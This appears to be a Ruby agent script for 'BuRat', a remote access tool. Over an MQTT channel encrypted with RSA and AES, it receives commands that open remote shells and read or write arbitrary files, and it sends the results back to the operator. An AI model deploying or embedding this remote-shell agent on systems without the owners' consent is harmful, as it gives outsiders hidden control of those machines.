require_relative 'burat'

burat = BuRat.new

params = {}
burat.internals[:optparse].program_name = "bushi"
burat.internals[:optparse].version = "0.0.1"
burat.internals[:optparse].on('-h', '--help', 'display help')
burat.internals[:optparse].parse!(into: params)

burat.internals[:rsa].config({
:encoded_key => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3UEh+HOkcBDCuJYRNgRb
GPRUCWZJp4PI2+X21AHPrK7EZ49eH2SNaKm6qivTzcv/+AQxNYzBZVU1AFKqSmKT
pueIIK6qEuh5GTnYsYiTXhNDdNLCFfXLDsc/adEAylSJg7NrBTf9NvanqcSPl/kC
ARNKGkusuh560tVI8NHIsPjwuN3oC49xbFSiyJfaoGa3RJijsMIgPM5zgS2DyJWH
6DxgX7/TbmXUVFkyPyfYhAizsuZijosmSI7SWIbQ7NaiJWdkiFp5lDRIjI5chHnY
CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
5QIDAQAB
-----END PUBLIC KEY-----'
})

burat.internals[:digest].config({
	:digest => 'md5'
})

burat.internals[:aes].config({
	:key_length => 128,
	:mode => :CTR
})

burat.add_topics({
	:nil										=> "bu/nil",
	:bushi									=> "bu/bushi/BURAT",
	:remoteshell						=> "bu/bushi/BURAT/bushido/remoteshell/+",
	:remoteshell_cmd_open		=> "bu/bushi/BURAT/bushido/remoteshell/+/cmd/open",
	:remoteshell_cmd_close	=> "bu/bushi/BURAT/bushido/remoteshell/+/cmd/close",
	:remoteshell_cmd_write	=> "bu/bushi/BURAT/bushido/remoteshell/+/cmd/write",
	:remoteshell_evt_read		=> "bu/bushi/BURAT/bushido/remoteshell/+/evt/read",
	:remoteshell_evt_write	=> "bu/bushi/BURAT/bushido/remoteshell/+/evt/write",
	:remoteshell_evt_error	=> "bu/bushi/BURAT/bushido/remoteshell/+/evt/error",
	:filerw									=> "bu/bushi/BURAT/bushido/filerw/+",
	:filerw_cmd_open				=> "bu/bushi/BURAT/bushido/filerw/+/cmd/open",
	:filerw_cmd_close				=> "bu/bushi/BURAT/bushido/filerw/+/cmd/close",
	:filerw_cmd_read				=> "bu/bushi/BURAT/bushido/filerw/+/cmd/read",
	:filerw_cmd_write				=> "bu/bushi/BURAT/bushido/filerw/+/cmd/write",
	:filerw_evt_read				=> "bu/bushi/BURAT/bushido/filerw/+/evt/read",
	:filerw_evt_write				=> "bu/bushi/BURAT/bushido/filerw/+/evt/write",
	:filerw_evt_error				=> "bu/bushi/BURAT/bushido/filerw/+/evt/error"
})

# remoteshell commands
burat.add_topic_callback(:remoteshell_cmd_open) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:remoteshell].open(packet.id, packet.shell)
end

burat.add_topic_callback(:remoteshell_cmd_close) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:remoteshell].close(packet.id)
end

burat.add_topic_callback(:remoteshell_cmd_write) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:remoteshell].write(packet.id, packet.data)
end

# filerw commands
burat.add_topic_callback(:filerw_cmd_open) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:filerw].open(packet.id, packet.path, packet.mode, packet.size)
end

burat.add_topic_callback(:filerw_cmd_close) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:filerw].close(packet.id)
end

burat.add_topic_callback(:filerw_cmd_read) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:filerw].read(packet.id, packet.length)
end

burat.add_topic_callback(:filerw_cmd_write) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:filerw].write(packet.id, packet.data)
end

# remoteshell events
burat.bushido[:remoteshell].on :open do |id|
  puts "remoteshell.open #{id}"
	remoteshell = burat.bushido[:remoteshell].remoteshells.find { |remoteshell| remoteshell.id == id }
	packet = { :id => id, :shell => remoteshell.shell }
	packet = burat.seen(packet)
	burat.publish(id, :remoteshell, packet, true, 2)
end

burat.bushido[:remoteshell].on :close do |id|
	puts "remoteshell.close #{id}"
	burat.publish(id, :remoteshell, nil, true, 2)
end

burat.bushido[:remoteshell].on :read do |id, data|
  puts "remoteshell.read #{id} #{data}"
	packet = { :id => id, :data	=> data }
	packet = burat.seen(packet)
	burat.publish(id, :remoteshell_evt_read, packet, false, 2)
end

burat.bushido[:remoteshell].on :write do |id, data|
  puts "remoteshell.write #{id} #{data}"
	packet = { :id => id, :data => data	}
	packet = burat.seen(packet)
	burat.publish(id, :remoteshell_evt_write, packet, false, 2)
end

burat.bushido[:remoteshell].on :error do |id, error|
  puts "remoteshell.error #{id} #{error}"
	packet = { :id => id, :error	=> error }
	packet = burat.seen(packet)
	burat.publish(id, :remoteshell_evt_error, packet, false, 2)
end

# filerw events
burat.bushido[:filerw].on :open do |id|
  puts "filerw.open #{id}"
	file = burat.bushido[:filerw].files.find { |file| file.id == id }
	packet = {
		:id				=> id,
		:path			=> file.path,
		:mode			=> file.mode,
		:size			=> file.size,
		:bytesio	=> file.bytesio
	}
	packet = burat.seen(packet)
	burat.publish(id, :filerw, packet, true, 2)
end

burat.bushido[:filerw].on :close do |id|
	puts "filerw.close #{id}"
	burat.publish(id, :filerw, nil, true, 2)
end

burat.bushido[:filerw].on :read do |id, data|
	puts "filerw.read #{id} #{data}"
	packet = { :id => id, :data	=> data }
	packet = burat.seen(packet)
	burat.publish(id, :filerw_evt_read, packet, false, 2)

	file = burat.bushido[:filerw].files.find { |file| file.id == id }
	packet = {
		:id			=> id,
		:path		=> file.path,
		:mode		=> file.mode,
		:size		=> file.size,
		:bytesio	=> file.bytesio
	}
	packet = burat.seen(packet)
	burat.publish(id, :filerw, packet, true, 2)
end

burat.bushido[:filerw].on :write do |id, length|
  puts "filerw.write #{id} #{length}"
	packet = { :id => id,	:length	=> length }
	packet = burat.seen(packet)
	burat.publish(id, :filerw_evt_write, packet, false, 2)

	file = burat.bushido[:filerw].files.find { |file| file.id == id }
	packet = {
		:id			=> id,
		:path		=> file.path,
		:mode		=> file.mode,
		:size		=> file.size,
		:bytesio	=> file.bytesio
	}
	packet = burat.seen(packet)
	burat.publish(id, :filerw, packet, true, 2)
end

burat.bushido[:filerw].on :error do |id, error|
  puts "filerw.error #{id} #{error}"
	packet = { :id => id, :error => error	}
	packet = burat.seen(packet)
	burat.publish(id, :filerw_evt_error, packet, false, 2)
end

last_ping_time = Time.now
loop do
	begin
		if burat.internals[:mqtt].connected? then
			burat.internals[:mqtt].mqtt_loop
			if last_ping_time <= Time.now - burat.internals[:mqtt].keep_alive then
				burat.ping
				last_ping_time = Time.now
			end
		else
			burat.connect() if !burat.connecting?
		end
	rescue StandardError => error
		puts error.full_message
			burat.connect() if !burat.connecting?
	end
end
